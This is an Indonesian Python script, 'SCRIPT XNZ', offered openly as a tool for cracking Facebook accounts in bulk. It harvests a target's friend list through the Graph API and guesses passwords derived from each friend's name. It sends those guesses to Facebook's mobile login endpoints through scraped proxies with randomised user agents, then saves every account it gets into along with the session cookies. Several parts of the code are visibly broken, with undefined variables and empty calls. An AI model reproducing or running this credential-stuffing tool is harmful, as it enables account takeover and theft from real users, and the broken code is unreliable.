#PERINGETAN BAGI PENGUNA SCRIPT

#Gw riper account y bocil2 munafik 1lgi ngapain gw riper SC PREMIUM GW SC gw aja udh gg g kek sc sc lain 100k kuning2 eh 1 lgi kalo nipu dosa apa crack jga g dosa crack=maling cil2

#PENJELASAN

#SCRIPT XNZ ADLAH SCRIPT UNTUK MELETAS PULUHAN BAHKAN RATUSAN AKUN FACEBOOK YANG BERBASIC LINUX TERMINAL

#SUPPROT

#SCRIPT INI SUPPROT KARTU TELEKOMSEL SELAIN NYA BELUM PERNAH SAYA PAKEK!

#SYARAT PENGUNA

#PENGUNA WAJIB MODE PESAWAT KETIKA CRACK BELANGSUNG UNTUK MENGHINDARI SPAM PADA IP ADRES DAN JIKA TARGET AKUN ADALAH NEW CONTOH TARGET : 10008-10005 MAKA CRACK LAH DARI AKUN NEW DAN SEBALIK NYA!

#AUTHOR INFOMATION

#AUTHOR RIDWAN-XD PENCINTA KE GELAPAN
#TEAM XTC_CODE√
#KONTAK 083862287464
#WARING SELAMAT MENCOBA SCRIPT XNZ

#IMPORT DI MULAI
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()
#IMPORT UGEN2
ugen1=[]
ugen=[]
fresh=[]
redmi=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#CLEAR DAN BACK
def clear():
	os.system(f'clear')
def back():
	get_cookies()
#DUMP PROXY
try:
	prix= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('ini_proxy.txt','w').write(prix)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()
#DUMP UGEN
def cilua():
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return (f"Mozilla/5.0 (Linux; U; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; en-gb; NEO-X5-116A Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 [FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]/{str(rr(20,50))}.608.27.0")
#BELES DUMP
for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi Note {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	bot = f'{A}{B}{C}{D}'
	if bot in redmi:pass
	else:redmi.append(bot)
#UGEN FIX
for x in range(1000):
	ao='Mozilla/5.0 (Linux; Android'
	lo=random.choice(['8','9','10','11','12'])
	oc='en-us; I1927 Build/RP1A.200720.012; wv)'
	od=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	oe=random.randrange(1, 9999)
	of=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	og='AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/'
	oh=random.randrange(90,210)
	oi='0'
	oj=random.randrange(3440,4900)
	oki=random.randrange(117,210)
	ol='Mobile Safari/537.36 Instagram 180.0.0.31.119    Android (30/11; 480dpi; 1080x2310; vivo/iQOO; I1927; I1928; qcom; e'
	uaku0=f'{ao} {lo}; {oc}) {og}{oh}.{oi}.{oj}.{oki} {ol}'
	fresh.append(uaku0)

for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12'])
	c=''
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.randrange(1, 999)
	g=random.randrange(1, 999)
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	j=random.randrange(73,100)
	k='0'
	l=random.randrange(4200,4900)
	m=random.randrange(40,150)
	n='Mobile Safari/537.36'
	uaku1=f'{aa} {b}; {c}{d}{e}{f}{g}{h}) {i}{j}.{k}.{l}.{m} {n}'
	ugen1.append(uaku1)


	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12'])
	c='motorola edge 20 lite'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(70,104)
	f='0'
	g=random.randrange(4200,4980)
	h=random.randrange(60,180)
	i='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku2)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/RIDWAN-XD778/ugen/a/blob/main/bbnew.txt').text
		ua=open('bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('bbnew.txt','r').read().splitlines()
#IDEN
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR
PUTIH = '\x1b[1;97m'
MERAH = '\x1b[1;91m'
HIJAU = '\x1b[1;92m'
KUNING = '\x1b[1;93m'
BIRU = '\x1b[1;94m'
UNNGU = '\x1b[1;95m' 
ORANGE = '\x1b[1;96m'
DEFAULT = '\x1b[0m'    
GATAU = "\033[1;30m"
P = '\x1b[1;97m'
K = '\x1b[1;93m'
H = '\x1b[1;92m'
x = '\x1b[1;97m'
#IMPORT BULAN
pil_wan = {'01':'Jan','02':'Feb','03':'Mar','04':'Ap','05':'May','06':'Jun','07':'Jul','08':'Agustus','09':'Sep','10':'Oct','11':'Nov','12':'Des'}
ttl = datetime.datetime.now().day
bul = pil_wan[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
st_ok = 'STRIMING-'+str(ttl)+'-'+str(bul)+'-'+str(th)+'.txt'
st_cp = 'CHEKPOINT-'+str(ttl)+'-'+str(bul)+'-'+str(th)+'.txt'
#live = ''+str(ttl)+'/'+str(bul)+'/'str(th)''
#UNTUK ANIMASI JALAN
def ____________ridwan______xd_____gans_____bet_____coeg(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
#LOGO_LU_GOBLOK+BGO
def logo_lu_goblok():
	____________ridwan______xd_____gans_____bet_____coeg(f"""{PUTIH}({HIJAU}+{PUTIH}) script by : {BIRU}ridwan-xd
{PUTIH}({HIJAU}+{PUTIH}) github : ridwanxd778
{PUTIH}({HIJAU}+{PUTIH}) Whatsapp : 083862287464""")
#CEK  COOKIES
def masuk____cookies_mu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			dancuk = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			dancox = json.loads(dancuk.text)['name']
			dancot = json.loads(dancuk.text)['id']
			menu(dancox,dancot)
		except KeyError:
			input____cookies()
		except requests.exceptions.ConnectionError:
			exit()
	except IOError:
		input____cookies()
def input____cookies():
	try:
		os.system('clear')
		logo_lu_goblok()
		prints(Panel(f"""{MM} HARAP MASUKAN COOKIES FACEBOOK DENGAN BENER SUPAYA...TIDAK MENGALAMI KE SALAHAN SAAT LOGIN...!""",title=f"{HH} PERHATIAN!!! ",style=f"{color_table}"))
		asu = random.choice([h])
		____cookies____lord=input(f'masukan cookies : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":____cookies____lord}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(____cookies____lord)
		os.system('python wan_run.py')
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'{M} LOGIN FAILED.....')
		exit()
#MENU CRACK
def list_menu(name_tumbal):
#CEK TUMBAL TUYU/DULU
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		time.sleep(5)
		get_cookies()
#MENU MULAI
	logo_lu_goblok()
	____________ridwan______xd_____gans_____bet_____coeg(f'{P}[{H} =>{P} ] ID TUMBAL : {name_tumbal}')
	____________ridwan______xd_____gans_____bet_____coeg(f'{P}[{H}=>{P} ] STATUS SCRIPT : FREE')
	print('')
	print(f'{P}1. crack public\n2. exit')
	____________ridwan______xd_____gans_____bet_____coy = input('\nSelect : ')
	print('')
	if ____________ridwan______xd_____gans_____bet_____coy in ['1']:
		public()
	elif ____________ridwan______xd_____gans_____bet_____coy in ['2']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		exit()
	else:
		back()
def error():
	time.sleep(4)
	back()
#crack satelit
def public():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	____________ridwan______xd_____gans_____bet_____coeg('{P}[{H}P{P}] {P}[{H}A{P}] {P}[{H}S{P}] {P}[{H}T{P}] {P}[{H}I{P}] {P}[{H}K{P}] {P}[{H}A{P}] {P}[{H}N{P}] {P}[{H}I{P}] {P}[{H}D{P}] {P}[{H}P{P}] {P}[{H}U{P}] {P}[{H}B{P}] {P}[{H}K{P}]')
	____________ridwan______xd_____gans_____bet_____co = input('id target : ')
	try:
		cuih = requests.get('https://graph.facebook.com/v1.0/'+____________ridwan______xd_____gans_____bet_____co+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in cuih['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		____________ridwan______xd_____gans_____bet_____coeg(f' {P}total {len(id)}')
		seetings_id()
	except requests.exceptions.ConnectionError:
		exit()
	except (KeyError,IOError):
		exit()
#PENGATURAN ID
def seetings_id():
	print('')
	print(f'{x}1. Id Old ({MERAH}Not Recommend{M}{x}){x} ')
	print(f'2. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	____________ridwan______xd_____gans_____bet_____id = input('Select : ')
	if ____________ridwan______xd_____gans_____bet_____id in ['1','01']:
		for old_best in sorted(id):
			id2.append(old_best)
			
	elif ____________ridwan______xd_____gans_____bet_____id in ['2','02']:
		for bapet in id:
			xxnx = random.randint(0,len(id2))
			id2.insert(xxnx,bapet)
	else:
		exit()
		print('')
		
	print('')
	____________ridwan______xd_____gans_____bet_____coeg(f'1. login from {BIRU}m.facebook.com{x} ({K}validate{P}) {x}')
	____________ridwan______xd_____gans_____bet_____coeg(f'2. login from {BIRU}free.facebook.com{x} ({K}validate{P}) {x}')
	____________ridwan______xd_____gans_____bet_____coeg(f'3. login from {BIRU}free.login.com{x} ({K}validate{P}){x}')
	____________ridwan______xd_____gans_____bet_____coeg(f'4. login from {BIRU}web.facebook..com{x} ({H}reguler{P}){x}')
	print('')
	____________ridwan______xd_____gans_____bet_____m = input(' Selec : ')
	if ____________ridwan______xd_____gans_____bet_____m in ['1','01']:
		method.append('mobile')
	elif ____________ridwan______xd_____gans_____bet_____m in ['2','02']:
		method.append('free')
	elif ____________ridwan______xd_____gans_____bet_____m in ['3','03']:
		method.append('mbasic')
	elif ____________ridwan______xd_____gans_____bet_____m in ['4','04,']:
		method.append('web')
	else:
		method.append('mobile')
	print('')
	otw_crack()
#-CRAKER-OTW-
def otw_crack():
	with tred(max_workers=30) as pool:
		for gass_crack in id2:
			idf,nmf = gass_crack.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwmu = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwmu.append(nmf)
					pwmu.append(frs+'12345')
					pwmu.append(frs+'1234')
					pwmu.append(frs+'321')
					pwmu.append(frs+'123')
			else:
				if len(frs)<3:
					pwmu.append(nmf)
				else:
					pwmu.append(nmf)
					pwmu.append(frs+'12345')
					pwmu.append(frs+'1234')
					pwmu.append(frs+'321')
					pwmu.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwmu.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'web' in method:
				pool.submit(crackxiaomi,idf,pwv)
			else:
				pool.submit(crackxiaomi,idf,pwv)
	print('')
	crak(f'CRACK SELESAI!')
	print(f'JUMBLAH{h} OK : {h}%s '%(ok))
	print(f'JUMBLAH{k} CP : {k}%s{x} '%(cp))
	print('') 
#JANGAN DI HAPUS ATAU DATA LU HILANG
def author():
	____________ridwan______xd_____gans_____bet_____coeg(f'SCRIPT BY : RIDWAN-XD')
	____________ridwan______xd_____gans_____bet_____coeg(f'TEAM 1 XTC•TEAM') 
	____________ridwan______xd_____gans_____bet_____coeg(f'TEAM 2 XY TEAM') 
	____________ridwan______xd_____gans_____bet_____coeg(f'TEAM 3 XTC_FLAME')
	____________ridwan______xd_____gans_____bet_____coeg(f'CODER INDONESIA') 
	____________ridwan______xd_____gans_____bet_____coeg(f'FREE SCRIPT')
	____________ridwan______xd_____gans_____bet_____coeg(f'MASUK GRUP TONGKORONGAN TERMUX') 
	____________ridwan______xd_____gans_____bet_____coeg(f'LINK GRUPS : https://chat.whatsapp.com/FP01KPvjske74Ugrdw2CSz ') 
#MOBILE
def crack(idf,pwk):
	global loop,ok,cp
	satwa_ran = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\rcrack {P}%s%s{P}/{K}%s{K} {H}livestriming{N}:{H}%s{P}/{K}chekpoint{N}:{K}%s{N} {P}%s%s%s{N}'%(satwa_ran,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice()
	ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 MQQBrowser/13.0.1 Mobile/15E148 Safari/604.1 QBWebViewUA/2 QBWebViewType/1 WKType/1"
	ses = requests.Session()
	try:os.mkdir('results')
	except:pass
	for pw in pwk:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{H} SAYANG AKUN TERKENA {st_cp}\n{P}({K}+{P}) ID FACEBOOK : {MERAH}{idf}\n{P}({K}+{P}) PASSWORD : {MERAH}{pw}{N}')
				print(f'\r{MERAH}{ua}{N}\n')
				open('CP/'+st_cp,'a').write(idf+'|'+pw)
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}{idf}|{pw}|{kuki}{N}')
				print(f'\r{H}{ua}{N}\n')
				open('OK/'+st_ok,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#FREE-FB
def crackfree(idf,pwv):
	global loop,ok,cp
	satwa_ran = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r_crack_ %s%s{P}/{MERAH}%s{PUTIH} {H}LIVESTRIMING{P}:{H}%s{P}/{K}CHEKPOINT{P}:{K}%s{P} %s%s%s{P}'%(satwa_ran,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 SP-engine/2.54.0 main%2F1.0 baiduboxapp/13.16.0.10 (Baidu; P2 13.7) NABar/1.0 themeUA=Theme/default"
	ses = requests.Session()
	try:os.mkdir('results')
	except:pass
	for pw in pwk:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} [{K}=>{P}] ID FACEBOOK  : {K}{idf}')
				print(f'\r{x} [{K}=>{P}] PASSWORD  FACEBOOK : {K}{pw}')
				print(f'\r{x} [{K}=>{P}] USER-AGENT BAWAN SCRIPT : {ua}\n')
				open('CP/'+st_cp,'a').write(idf+'|'+pw)
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				
				print(f'\r{x} [{H}=>{N}] ID FACEBOOK   : {H}{idf}')
				print(f'\r{x} [{H}=>{N}] PASSWORD  FACEBOOK : {H}{pw}')
				print(f'\r{x} [{H}=>{N}] COOKIE FACEBOOK    : {m}{kuki}{x}')
				print(f'\r{x}[{H}=>{P}] USER-AGENT BAWWAN SCRIPT : {x}{M}{ua}{M}\n')
				print(f'''{x}[{H}=>{P}] {HIJAU}ridwan-xd
ilham no cunter
rull ganz
van''')
				open('OK/'+st_ok,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#MBASIC
def crackmbasic(idf,pwk):
	global loop,ok,cp
	satwa_ran = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r__mmz__ {P}%s%s{P}/{MERAH}%s{P} {H}LIVESTRIMING{P}:{H}%s{P}/{K}CHEKPOINT{P}:{K}%s{P} %s%s%s{N}'%(satwa_ran,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua2 = random.choice(["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Lite Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.1.1; en-US; ALCATEL ONE TOUCH 4030D Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.5.623 U3/0.8.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 12; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"])
	ua = random.choice(redmi)
	ua2 = "Mozilla/5.0 (Linux; Android 4.4.2; htc_v01 Build/KOT49H) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (19/4.4.2 ; 240dpi; 480x782; htc; htc_v01; htc_v01_u; mt6582; ru_RU; 2394"
	ses = requests.Session()
	for pw in pwk:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
